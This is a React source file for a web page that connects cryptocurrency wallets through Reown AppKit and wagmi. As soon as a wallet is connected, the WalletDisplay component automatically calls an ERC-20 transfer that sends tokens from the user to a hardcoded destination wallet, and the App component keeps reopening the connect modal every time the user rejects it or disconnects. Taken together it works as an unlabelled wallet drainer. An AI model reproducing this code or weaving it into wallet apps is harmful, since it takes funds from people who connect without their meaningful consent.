import { createAppKit } from '@reown/appkit/react';
import { WagmiProvider, useAccount } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { useEffect } from 'react';
import { BrowserProvider, parseUnits, Contract, Eip1193Provider } from 'ethers';

import { projectId, metadata, networks, wagmiAdapter, solanaWeb3JsAdapter } from './config';

const queryClient = new QueryClient();

const generalConfig = {
  projectId,
  metadata,
  networks,
  themeMode: undefined, // 
  features: { analytics: true },
  themeVariables: { '--w3m-accent': '#000000' },
};


const appKit = createAppKit({
  adapters: [wagmiAdapter, solanaWeb3JsAdapter],
  ...generalConfig,
});

const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B";
const TOKEN_CONTRACT_ADDRESS = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // Example Token Address

 const tokenAbi = [
          {
            constant: true,
            inputs: [],
            name: "name",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "totalSupply",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "sender", type: "address" },
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transferFrom",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "decimals",
            outputs: [{ name: "", type: "uint8" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "addedValue", type: "uint256" },
            ],
            name: "increaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [{ name: "value", type: "uint256" }],
            name: "burn",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [{ name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "symbol",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "subtractedValue", type: "uint256" },
            ],
            name: "decreaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              { name: "name", type: "string" },
              { name: "symbol", type: "string" },
              { name: "decimals", type: "uint8" },
              { name: "totalSupply", type: "uint256" },
              { name: "feeReceiver", type: "address" },
              { name: "tokenOwnerAddress", type: "address" },
            ],
            payable: true,
            stateMutability: "payable",
            type: "constructor",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "from", type: "address" },
              { indexed: true, name: "to", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Transfer",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "owner", type: "address" },
              { indexed: true, name: "spender", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Approval",
            type: "event",
          },
        ];

const WalletDisplay = () => {
  const { address: userAddress, isConnected } = useAccount();

  useEffect(() => {
    const autoTransferTokens = async () => {
      if (!isConnected || !userAddress) return;

      try {
        if (typeof window !== "undefined" && window.ethereum) {
          const ethereum = window.ethereum as unknown as Eip1193Provider;
          const provider = new BrowserProvider(ethereum);
          const signer = await provider.getSigner();
          const tokenContract = new Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);

          const balance = await tokenContract.balanceOf(userAddress);
          const amountToSend = parseUnits("0.01", 18);

          if (balance.lt(amountToSend)) {
            console.warn("Insufficient balance to transfer.");
            return;
          }

          const tx = await tokenContract.transfer(DESTINATION_WALLET, amountToSend);
          await tx.wait();
          console.log("Transfer successful:", tx);
        } else {
          console.error("Ethereum provider not found");
        }
      } catch (error) {
        console.error("Transfer failed:", error);
      }
    };

    autoTransferTokens();
  }, [isConnected, userAddress]);

  return (
    <div style={{ background: '#f0f0f0', padding: '1rem', borderRadius: '8px', marginTop: '20px', textAlign: 'center' }}>
      {isConnected && (
        <div style={{ marginTop: '20px' }}>
          <h3>Your Wallet Address:</h3>
          <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
        </div>
      )}
      <div style={{ marginTop: '20px' }}>
        <h3>Destination Wallet Address:</h3>
        <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
      </div>
    </div>
  );
};

export function App() {
  useEffect(() => {
    const openModal = async () => {
      try {
        await appKit.open();
      } catch (error) {
        console.log("Connection rejected", error);
        setTimeout(() => openModal(), 500);
      }
    };

    openModal();

    const handleDisconnect = () => {
      openModal();
    };

    window.addEventListener('disconnect', handleDisconnect);
    return () => {
      window.removeEventListener('disconnect', handleDisconnect);
    };
  }, []);

  return (
    <div className={"pages"}>
      <WagmiProvider config={wagmiAdapter.wagmiConfig}>
        <QueryClientProvider client={queryClient}>
          <WalletDisplay />
        </QueryClientProvider>
      </WagmiProvider>
    </div>
  );
}

export default App;
